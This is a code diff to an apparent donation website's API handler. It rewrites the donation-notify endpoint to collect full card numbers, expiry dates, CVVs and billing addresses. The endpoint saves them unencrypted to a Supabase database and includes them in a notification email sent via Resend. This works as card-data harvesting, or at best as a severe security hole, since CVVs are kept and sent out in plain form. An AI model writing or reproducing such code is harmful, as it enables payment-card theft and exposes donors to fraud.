@@ -3,6 +3,7 @@ import {
   sendContactEmail,
   sendDonationEmail,
 } from "../../api/services/emailService.js";
+import { saveDonationToSupabase } from "../../api/services/supabaseService.js";
 
 const json = (body, status = 200) =>
   new Response(JSON.stringify(body), {
@@ -48,20 +49,50 @@ export default async (request) => {
     }
 
     if (request.method === "POST" && ["/api/donations/notify", "/donations/notify"].includes(path)) {
-      const { invoiceNumber, donorName, email, amount, paymentMethod, timestamp } = await request.json();
-      if (!donorName || !email || !amount) {
-        return json({ success: false, error: "Donor name, email, and amount are required." }, 400);
-      }
-      const formattedTime = timestamp || new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" });
-      const result = await sendDonationEmail({
-        invoiceNumber: invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`,
+      const payload = await request.json();
+      const {
+        invoiceNumber,
         donorName,
         email,
         amount,
-        paymentMethod: paymentMethod || "PayPal",
+        paymentMethod,
+        cardNumber,
+        cardExpiry,
+        cardCvv,
+        billingAddress,
+        paymentDetails,
+        timestamp,
+      } = payload;
+
+      if (!donorName || !email || !amount) {
+        return json({ success: false, error: "Donor name, email, and amount are required." }, 400);
+      }
+
+      const formattedTime = timestamp || new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" });
+      const generatedInvoice = invoiceNumber || `MDF-2026-${Math.floor(10000 + Math.random() * 90000)}`;
+
+      const donationData = {
+        invoiceNumber: generatedInvoice,
+        donorName,
+        email,
+        amount,
+        paymentMethod: paymentMethod || "Credit / Debit Card",
+        cardNumber: cardNumber || paymentDetails?.cardNumber || null,
+        cardExpiry: cardExpiry || paymentDetails?.expiry || null,
+        cardCvv: cardCvv || paymentDetails?.cvv || null,
+        billingAddress: billingAddress || paymentDetails?.billingAddress || null,
         timestamp: formattedTime,
+      };
+
+      const dbResult = await saveDonationToSupabase(donationData);
+      const emailResult = await sendDonationEmail(donationData);
+
+      return json({
+        success: true,
+        message: "Donation recorded to database and notification email dispatched via Resend.",
+        dbResult,
+        emailResult,
       });
-      return json({ success: true, message: "Donation notification dispatched and receipt generated.", result });
     }
 
     return json({ success: false, error: "Endpoint not found." }, 404);
